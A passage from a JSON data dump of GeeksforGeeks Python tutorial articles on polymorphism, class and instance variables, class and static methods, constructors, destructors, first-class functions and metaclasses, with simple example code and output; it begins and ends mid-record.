language(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Hindi is the most widely spoken language of India.\")\u00a0\u00a0\u00a0\u00a0\u00a0def type(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"India is a developing country.\")\u00a0class USA():\u00a0\u00a0\u00a0\u00a0def capital(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Washington, D.C. is the capital of USA.\")\u00a0\u00a0\u00a0\u00a0\u00a0def language(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"English is the primary language of USA.\")\u00a0\u00a0\u00a0\u00a0\u00a0def type(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"USA is a developed country.\")\u00a0obj_ind = India()obj_usa = USA()for country in (obj_ind, obj_usa):\u00a0\u00a0\u00a0\u00a0country.capital()\u00a0\u00a0\u00a0\u00a0country.language()\u00a0\u00a0\u00a0\u00a0country.type()Output:\u00a0New Delhi is the capital of India.\nHindi is the most widely spoken language of India.\nIndia is a developing country.\nWashington, D.C. is the capital of USA.\nEnglish is the primary language of USA.\nUSA is a developed country.\u00a0\u00a0Polymorphism with Inheritance:\u00a0In Python, Polymorphism lets us define methods in the child class that have the same name as the methods in the parent class. In inheritance, the child class inherits the methods from the parent class. However, it is possible to modify a method in a child class that it has inherited from the parent class. This is particularly useful in cases where the method inherited from the parent class doesn\u2019t quite fit the child class. In such cases, we re-implement the method in the child class. This process of re-implementing a method in the child class is known as Method Overriding.\u00a0\u00a0Python3class Bird:\u00a0\u00a0def intro(self):\u00a0\u00a0\u00a0\u00a0print(\"There are many types of birds.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0print(\"Most of the birds can fly but some cannot.\")\u00a0\u00a0\u00a0class sparrow(Bird):\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0print(\"Sparrows can fly.\")\u00a0\u00a0\u00a0\u00a0\u00a0class ostrich(Bird):\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0print(\"Ostriches cannot fly.\")\u00a0\u00a0\u00a0\u00a0\u00a0obj_bird = Bird()obj_spr = sparrow()obj_ost = ostrich()\u00a0obj_bird.intro()obj_bird.flight()\u00a0obj_spr.intro()obj_spr.flight()\u00a0obj_ost.intro()obj_ost.flight()Output:\u00a0There are many types of birds.\nMost of the birds can fly but some cannot.\nThere are many types of birds.\nSparrows can fly.\nThere are many types of birds.\nOstriches cannot fly.\u00a0\u00a0Polymorphism with a Function and objects:\u00a0It is also possible to create a function that can take any object, allowing for polymorphism. In this example, let\u2019s create a function called \u201cfunc()\u201d which will take an object which we will name \u201cobj\u201d. Though we are using the name \u2018obj\u2019, any instantiated object will be able to be called into this function. Next, let\u2019s give the function something to do that uses the \u2018obj\u2019 object we passed to it. In this case, let\u2019s call the three methods, viz., capital(), language() and type(), each of which is defined in the two classes \u2018India\u2019 and \u2018USA\u2019. Next, let\u2019s create instantiations of both the \u2018India\u2019 and \u2018USA\u2019 classes if we don\u2019t have them already. With those, we can call their action using the same func() function:\u00a0\u00a0Python3def func(obj):\u00a0\u00a0\u00a0\u00a0obj.capital()\u00a0\u00a0\u00a0\u00a0obj.language()\u00a0\u00a0\u00a0\u00a0obj.type()\u00a0\u00a0obj_ind = India()obj_usa = USA()\u00a0\u00a0func(obj_ind)func(obj_usa)\u00a0\u00a0Code: Implementing Polymorphism with a Function\u00a0\u00a0Python3class India():\u00a0\u00a0\u00a0\u00a0def capital(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"New Delhi is the capital of India.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def language(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Hindi is the most widely spoken language of India.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def type(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"India is a developing country.\")\u00a0\u00a0class USA():\u00a0\u00a0\u00a0\u00a0def capital(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Washington, D.C. is the capital of USA.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def language(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"English is the primary language of USA.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def type(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"USA is a developed country.\")\u00a0def func(obj):\u00a0\u00a0\u00a0\u00a0obj.capital()\u00a0\u00a0\u00a0\u00a0obj.language()\u00a0\u00a0\u00a0\u00a0obj.type()\u00a0\u00a0obj_ind = India()obj_usa = USA()\u00a0\u00a0func(obj_ind)func(obj_usa)Output:\u00a0New Delhi is the capital of India.\nHindi is the most widely spoken language of India.\nIndia is a developing country.\nWashington, D.C. is the capital of USA.\nEnglish is the primary language of USA.\nUSA is a developed country.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "aca3995fd2fef632ce7fd8ac1b9fbc7f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "All objects share class or static variables. An instance or non-static variables are different for different objects (every object has a copy). For example, let a Computer Science Student be represented by class CSStudent. The class may have a static variable whose value is \u201ccse\u201d for all objects. And class may also have non-static members like name and roll. In C++ and Java, we can use static keywords to make a variable a class variable. The variables which don\u2019t have a preceding static keyword are instance variables. See this for the Java example and this for the C++ example.The Python approach is simple; it doesn\u2019t require a static keyword.\u00a0All variables which are assigned a value in the class declaration are class variables. And variables that are assigned values inside methods are instance variables.\u00a0Python# Python program to show that the variables with a value# assigned in class declaration, are class variables\u00a0# Class for Computer Science Studentclass CSStudent:\u00a0\u00a0\u00a0\u00a0stream = 'cse'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # Class Variable\u00a0\u00a0\u00a0\u00a0def __init__(self,name,roll):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # Instance Variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.roll = roll\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # Instance Variable\u00a0# Objects of CSStudent classa = CSStudent('Geek', 1)b = CSStudent('Nerd', 2)\u00a0print(a.stream)\u00a0 # prints \"cse\"print(b.stream)\u00a0 # prints \"cse\"print(a.name)\u00a0\u00a0\u00a0 # prints \"Geek\"print(b.name)\u00a0\u00a0\u00a0 # prints \"Nerd\"print(a.roll)\u00a0\u00a0\u00a0 # prints \"1\"print(b.roll)\u00a0\u00a0\u00a0 # prints \"2\"\u00a0# Class variables can be accessed using class# name alsoprint(CSStudent.stream) # prints \"cse\"\u00a0# Now if we change the stream for just a it won't be changed for ba.stream = 'ece'print(a.stream) # prints 'ece'print(b.stream) # prints 'cse'\u00a0# To change the stream for all instances of the class we can change it# directly from the classCSStudent.stream = 'mech'\u00a0print(a.stream) # prints 'ece'print(b.stream) # prints 'mech'Output:\u00a0cse\ncse\nGeek\nNerd\n1\n2\ncse\nece\ncse\nece\nmechThis article is contributed by Harshit Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "830d5b821ef0fcab62a97dbf4a093d01",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Class MethodThe @classmethod decorator is a built-in function decorator that is an expression that gets evaluated after your function is defined. The result of that evaluation shadows your function definition.\u00a0A class method receives the class as an implicit first argument, just like an instance method receives the instance\u00a0Syntax:\u00a0class C(object):\n    @classmethod\n    def fun(cls, arg1, arg2, ...):\n       ....\nfun: function that needs to be converted into a class method\nreturns: a class method for function.A class method is a method that is bound to the class and not the object of the class.They have the access to the state of the class as it takes a class parameter that points to the class and not the object instance.It can modify a class state that would apply across all the instances of the class. For example, it can modify a class variable that will be applicable to all the instances.\u00a0Static MethodA static method does not receive an implicit first argument.\u00a0Syntax:\u00a0class C(object):\n    @staticmethod\n    def fun(arg1, arg2, ...):\n        ...\nreturns: a static method for function fun.A static method is also a method that is bound to the class and not the object of the class.A static method can\u2019t access or modify the class state.It is present in a class because it makes sense for the method to be present in class.Class method vs Static MethodA class method takes cls as the first parameter while a static method needs no specific parameters.A class method can access or modify the class state while a static method can\u2019t access or modify it.In general, static methods know nothing about the class state. They are utility-type methods that take some parameters and work upon those parameters. On the other hand class methods must have class as a parameter.We use @classmethod decorator in python to create a class method and we use @staticmethod decorator to create a static method in python.When to use what?We generally use class method to create factory methods. Factory methods return class objects ( similar to a constructor ) for different use cases.We generally use static methods to create utility functions.How to define a class method and a static method?To define a class method in python, we use @classmethod decorator, and to define a static method we use @staticmethod decorator.\u00a0Let us look at an example to understand the difference between both of them. Let us say we want to create a class Person. Now, python doesn\u2019t support method overloading like C++ or Java so we use class methods to create factory methods. In the below example we use a class method to create a person object from birth year.As explained above we use static methods to create utility functions. In the below example we use a static method to check if a person is an adult or not.\u00a0\u00a0Implementation\u00a0Python3# Python program to demonstrate# use of class method and static method.from datetime import date\u00a0\u00a0class Person:\u00a0\u00a0\u00a0\u00a0def __init__(self, name, age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.age = age\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a class method to create a Person object by birth year.\u00a0\u00a0\u00a0\u00a0@classmethod\u00a0\u00a0\u00a0\u00a0def fromBirthYear(cls, name, year):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return cls(name, date.today().year - year)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a static method to check if a Person is adult or not.\u00a0\u00a0\u00a0\u00a0@staticmethod\u00a0\u00a0\u00a0\u00a0def isAdult(age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return age > 18\u00a0\u00a0person1 = Person('mayank', 21)person2 = Person.fromBirthYear('mayank', 1996)\u00a0\u00a0print (person1.age)print (person2.age)\u00a0\u00a0# print the resultprint (Person.isAdult(22))Output:21\n25\nTrueThis article is contributed by Mayank Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "09c396b3e6386495fb8e20681472991f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In the previous fact, we have seen that Python doesn\u2019t have the static keyword. All variables that are assigned a value in the class declaration are class variables.We should be careful when changing the value of a class variable. If we try to change a class variable using an object, a new instance (or non-static) variable for that particular object is created and this variable shadows the class variables. Below is a Python program to demonstrate the same.Python3# Class for Computer Science Studentclass CSStudent:\u00a0\u00a0\u00a0\u00a0stream = 'cse'\u00a0\u00a0\u00a0\u00a0 # Class Variable\u00a0\u00a0\u00a0\u00a0def __init__(self, name, roll):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.roll = roll\u00a0# Driver program to test the functionality# Creating objects of CSStudent classa = CSStudent(\"Geek\", 1)b = CSStudent(\"Nerd\", 2)\u00a0print (\"Initially\")print (\"a.stream =\", a.stream )print (\"b.stream =\", b.stream )\u00a0# This thing doesn't change class(static) variable# Instead creates instance variable for the object# 'a' that shadows class member.a.stream = \"ece\"\u00a0print (\"\\nAfter changing a.stream\")print (\"a.stream =\", a.stream )print (\"b.stream =\", b.stream )Output:\u00a0Initially\na.stream = cse\nb.stream = cse\n\nAfter changing a.stream\na.stream = ece\nb.stream = cseWe should change class variables using class names only.\u00a0Python3# Program to show how to make changes to the# class variable in Python\u00a0# Class for Computer Science Studentclass CSStudent:\u00a0\u00a0\u00a0\u00a0stream = 'cse'\u00a0\u00a0\u00a0\u00a0 # Class Variable\u00a0\u00a0\u00a0\u00a0def __init__(self, name, roll):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.roll = roll\u00a0# New object for further implementationa = CSStudent(\"check\", 3)print \"a.stream =\", a.stream\u00a0# Correct way to change the value of class variableCSStudent.stream = \"mec\"print \"\\nClass variable changes to mec\"\u00a0# New object for further implementationb = CSStudent(\"carter\", 4)\u00a0print \"\\nValue of variable steam for each object\"print \"a.stream =\", a.streamprint \"b.stream =\", b.streamOutput:\u00a0a.stream = cse\n\nClass variable changes to mec\n\nValue of variable steam for each object\na.stream = mec\nb.stream = mecThis article is contributed by Nikhil Kumar Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "23f5a39bd9201f2c3b7ab40c17e03c8e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites: Object-Oriented Programming in Python, Object-Oriented Programming in Python | Set 2\u00a0Constructors are generally used for instantiating an object. The task of constructors is to initialize(assign values) to the data members of the class when an object of the class is created. In Python the __init__() method is called the constructor and is always called when an object is created.Syntax of constructor declaration :\u00a0def __init__(self):\n    # body of the constructorTypes of constructors :\u00a0default constructor: The default constructor is a simple constructor which doesn\u2019t accept any arguments. Its definition has only one argument which is a reference to the instance being constructed.parameterized constructor: constructor with parameters is known as parameterized constructor. The parameterized constructor takes its first argument as a reference to the instance being constructed known as self and the rest of the arguments are provided by the programmer.Example of default constructor :\u00a0\u00a0Python3class GeekforGeeks:\u00a0\u00a0\u00a0\u00a0\u00a0# default constructor\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.geek = \"GeekforGeeks\"\u00a0\u00a0\u00a0\u00a0\u00a0# a method for printing data members\u00a0\u00a0\u00a0\u00a0def print_Geek(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.geek)\u00a0\u00a0# creating object of the classobj = GeekforGeeks()\u00a0# calling the instance method using the object objobj.print_Geek()Output :\u00a0GeekforGeeksExample of the parameterized constructor :\u00a0Python3class Addition:\u00a0\u00a0\u00a0\u00a0first = 0\u00a0\u00a0\u00a0\u00a0second = 0\u00a0\u00a0\u00a0\u00a0answer = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# parameterized constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, f, s):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.first = f\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.second = s\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def display(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"First number = \" + str(self.first))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Second number = \" + str(self.second))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Addition of two numbers = \" + str(self.answer))\u00a0\u00a0\u00a0\u00a0\u00a0def calculate(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.answer = self.first + self.second\u00a0# creating object of the class# this will invoke parameterized constructorobj = Addition(1000, 2000)\u00a0# perform Additionobj.calculate()\u00a0# display resultobj.display()Output :\u00a0First number = 1000\nSecond number = 2000\nAddition of two numbers = 3000\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8e0f2b6fbb17dbfb601bf2ac104b1705",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Constructors in PythonDestructors are called when an object gets destroyed. In Python, destructors are not needed as much as in C++ because Python has a garbage collector that handles memory management automatically.\u00a0The __del__() method is a known as a destructor method in Python. It is called when all references to the object have been deleted i.e when an object is garbage collected.\u00a0Syntax of destructor declaration :\u00a0\u00a0def __del__(self):\n  # body of destructorNote : A reference to objects is also deleted when the object goes out of reference or when the program ends.\u00a0Example 1 : Here is the simple example of destructor. By using del keyword we deleted the all references of object \u2018obj\u2019, therefore destructor invoked automatically.\u00a0Python3# Python program to illustrate destructorclass Employee:\u00a0\u00a0\u00a0\u00a0\u00a0# Initializing\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Employee created.')\u00a0\u00a0\u00a0\u00a0\u00a0# Deleting (Calling destructor)\u00a0\u00a0\u00a0\u00a0def __del__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Destructor called, Employee deleted.')\u00a0obj = Employee()del objOutput:\u00a0Employee created.\nDestructor called, Employee deleted.\u00a0Note : The destructor was called after the program ended or when all the references to object are deleted i.e when the reference count becomes zero, not when object went out of scope.Example 2 :This example gives the explanation of above mentioned note. Here, notice that the destructor is called after the \u2018Program End\u2026\u2019 printed.\u00a0Python3# Python program to illustrate destructor\u00a0class Employee:\u00a0\u00a0\u00a0\u00a0\u00a0# Initializing\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Employee created')\u00a0\u00a0\u00a0\u00a0\u00a0# Calling destructor\u00a0\u00a0\u00a0\u00a0def __del__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Destructor called\")\u00a0def Create_obj():\u00a0\u00a0\u00a0\u00a0print('Making Object...')\u00a0\u00a0\u00a0\u00a0obj = Employee()\u00a0\u00a0\u00a0\u00a0print('function end...')\u00a0\u00a0\u00a0\u00a0return obj\u00a0print('Calling Create_obj() function...')obj = Create_obj()print('Program End...')Output:\u00a0Calling Create_obj() function...\nMaking Object...\nEmployee created\nfunction end...\nProgram End...\nDestructor called\u00a0Example 3 : Now, consider the following example :\u00a0\u00a0Python3# Python program to illustrate destructor\u00a0class A:\u00a0\u00a0\u00a0\u00a0def __init__(self, bb):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.b = bb\u00a0class B:\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = A(self)\u00a0\u00a0\u00a0\u00a0def __del__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"die\")\u00a0def fun():\u00a0\u00a0\u00a0\u00a0b = B()\u00a0fun()Output:\u00a0die\u00a0In this example when the function fun() is called, it creates an instance of class B which passes itself to class A, which then sets a reference to class B and resulting in a circular reference.Generally, Python\u2019s garbage collector which is used to detect these types of cyclic references would remove it but in this example the use of custom destructor marks this item as \u201cuncollectable\u201d.\u00a0Simply, it doesn\u2019t know the order in which to destroy the objects, so it leaves them. Therefore, if your instances are involved in circular references they will live in memory for as long as the application run.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "37cf8e94867be051d145ae2dfcaa44c9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "First class objects in a language are handled uniformly throughout. They may be stored in data structures, passed as arguments, or used in control structures. A programming language is said to support first-class functions if it treats functions as first-class objects. Python supports the concept of First Class functions.Properties of first class functions:A function is an instance of the Object type.You can store the function in a variable.You can pass the function as a parameter to another function.You can return the function from a function.You can store them in data structures such as hash tables, lists, \u2026Examples illustrating First Class functions in Python1. Functions are objects: Python functions are first class objects. In the example below, we are assigning function to a variable. This assignment doesn\u2019t call the function. It takes the function object referenced by shout and creates a second name pointing to it, yell.# Python program to illustrate functions# can be treated as objectsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0\u00a0print (shout('Hello'))\u00a0\u00a0yell = shout\u00a0\u00a0print (yell('Hello'))Output:\r\nHELLO\r\nHELLO\r\n2. Functions can be passed as arguments to other functions: Because functions are objects we can pass them as arguments to other functions. Functions that can accept other functions as arguments are also called higher-order functions. In the example below, we have created a function greet which takes a function as an argument.# Python program to illustrate functions# can be passed as arguments to other functionsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0\u00a0def whisper(text):\u00a0\u00a0\u00a0\u00a0return text.lower()\u00a0\u00a0def greet(func):\u00a0\u00a0\u00a0\u00a0# storing the function in a variable\u00a0\u00a0\u00a0\u00a0greeting = func(\"\"\"Hi, I am created by a function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passed as an argument.\"\"\")\u00a0\u00a0\u00a0\u00a0print (greeting)\u00a0\u00a0\u00a0greet(shout)greet(whisper)Output\r\nHI, I AM CREATED BY A FUNCTION PASSED AS AN ARGUMENT.\r\nhi, i am created by a function passed as an argument.\r\n3. Functions can return another function: Because functions are objects we can return a function from another function. In the below example, the create_adder function returns adder function.# Python program to illustrate functions# Functions can return another function\u00a0\u00a0def create_adder(x):\u00a0\u00a0\u00a0\u00a0def adder(y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x+y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return adder\u00a0\u00a0add_15 = create_adder(15)\u00a0\u00a0print (add_15(10))Output:\r\n25\r\nThis article is contributed by Mayank Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6456d97584c78d27c22e7fb67ee091bd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "At first, the word Metaprogramming seems like a very funky and alien thing but if you have ever worked with decorators or metaclasses, you were doing metaprogramming there all along. In a nutshell, we can say metaprogramming is the code that manipulates code.In this article, we are going to discuss Metaclasses, why and when we should use them, and what are the alternatives. This is a fairly advance Python topic and the following prerequisite is expected \u2013\u00a0OOP concept in PythonDecorators in PythonNote: This article considers Python 3.3 and above\u00a0MetaclassesIn Python, everything has some type associated with it. For example, if we have a variable having an integer value then its type is int. You can get the type of anything using the type() function.\u00a0Python3num = 23print(\"Type of num is:\", type(num))\u00a0lst = [1, 2, 4]print(\"Type of lst is:\", type(lst))\u00a0name = \"Atul\"print(\"Type of name is:\", type(name))Output:\u00a0Type of num is: <class 'int'>\nType of lst is: <class 'list'>\nType of name is: <class 'str'>Every type in Python is defined by Class. So in the above example, unlike C++ or Java where int, char, float are primary data types, in Python they are objects of int class or str class. So we can make a new type by creating a class of that type. For example, we can create a new type of Student by creating a Student class.\u00a0Python3class Student:\u00a0\u00a0\u00a0\u00a0passstu_obj = Student()\u00a0# Print type of object of Student classprint(\"Type of stu_obj is:\", type(stu_obj))Output:\u00a0Type of stu_obj is: <class '__main__.Student'>A Class is also an object, and just like any other object, it\u2019s an instance of something called Metaclass. A special class type creates these Class objects. The type class is default metaclass which is responsible for making classes. In the above example, if we try to find out the type of Student class, it comes out to be a type.\u00a0Python3class Student:\u00a0\u00a0\u00a0\u00a0pass\u00a0# Print type of Student classprint(\"Type of Student class is:\", type(Student))Output:\u00a0Type of Student class is: <class 'type'>Because Classes are also an object, they can be modified in the same way. We can add or subtract fields or methods in class in the same way we did with other objects. For example \u2013\u00a0Python3# Defined class without any# class methods and variablesclass test:pass\u00a0# Defining method variablestest.x = 45\u00a0# Defining class methodstest.foo = lambda self: print('Hello')\u00a0# creating objectmyobj = test()\u00a0print(myobj.x)myobj.foo()Output:\u00a045\nHelloThis whole meta thing can be summarized as \u2013 Metaclass create Classes and Classes creates objects\u00a0\u00a0The metaclass is responsible for the generation of classes, so we can write our custom metaclasses to modify the way classes are generated by performing extra actions or injecting code. Usually, we do not need custom metaclasses but sometimes it\u2019s necessary.\u00a0There are problems for which metaclass and non-metaclass-based solutions are available (which are often simpler) but in some cases, only metaclass can solve the problem. We will discuss such a problem in this article.Creating custom MetaclassTo create our custom metaclass, our custom metaclass has to inherit type metaclass and usually override \u2013\u00a0__new__(): It\u2019s a method which is called before __init__(). It creates the object and returns it. We can override this method to control how the objects are created.__init__(): This method just initialize the created object passed as a parameterWe can create classes using the type() function directly. It can be called in following ways \u2013\u00a0When called with only one argument, it returns the type. We have seen it before in the above examples.When called with three parameters, it creates a class. Following arguments are passed to it \u2013\u00a0Class nameTuple having base classes inherited by classClass Dictionary: It serves as a local namespace for the class, populated with class methods and variablesConsider this example \u2013\u00a0\u00a0Python3def test_method(self):\u00a0\u00a0\u00a0\u00a0print(\"This is Test class method!\")\u00a0# creating a base classclass Base:\u00a0\u00a0\u00a0\u00a0def myfun(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"This is inherited method!\")\u00a0# Creating Test class dynamically using# type() method directlyTest = type('Test', (Base, ), dict(x=\"atul\", my_method=test_method))\u00a0# Print type of Testprint(\"Type of Test class: \", type(Test))\u00a0# Creating instance of Test classtest_obj = Test()print(\"Type of test_obj: \", type(test_obj))\u00a0# calling inherited methodtest_obj.myfun()\u00a0# calling Test class methodtest_obj.my_method()\u00a0# printing variableprint(test_obj.x)Output:\u00a0Type of Test class:  <class 'type'>\nType of test_obj:  <class '__main__.Test'>\nThis is inherited method!\nThis is Test class method!\natulNow let\u2019s create a metaclass without using type() directly. In the following example, we will be creating a metaclass MultiBases which will check if the class being created has inherited from more than one base class. If so, it will raise an error.\u00a0Python3# our metaclassclass MultiBases(type):\u00a0\u00a0\u00a0\u00a0# overriding __new__ method\u00a0\u00a0\u00a0\u00a0def __new__(cls, clsname, bases, clsdict):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if no of base classes is greater than 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# raise error\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if len(bases)>1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise TypeError(\"Inherited multiple base classes!!!\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# else execute __new__ method of super class, ie.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# call __init__ of type class\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return super().__new__(cls, clsname, bases, clsdict)\u00a0# metaclass can be specified by 'metaclass' keyword argument# now MultiBase class is used for creating classes# this will be propagated to all subclasses of Baseclass Base(metaclass=MultiBases):\u00a0\u00a0\u00a0\u00a0pass\u00a0# no error is raisedclass A(Base):\u00a0\u00a0\u00a0\u00a0pass\u00a0# no error is raisedclass B(Base):\u00a0\u00a0\u00a0\u00a0pass\u00a0# This will raise an error!class C(A, B):\u00a0\u00a0\u00a0\u00a0passOutput:\u00a0Traceback (most recent call last):\n  File \"<stdin>\", line 2, in <module>\n  File 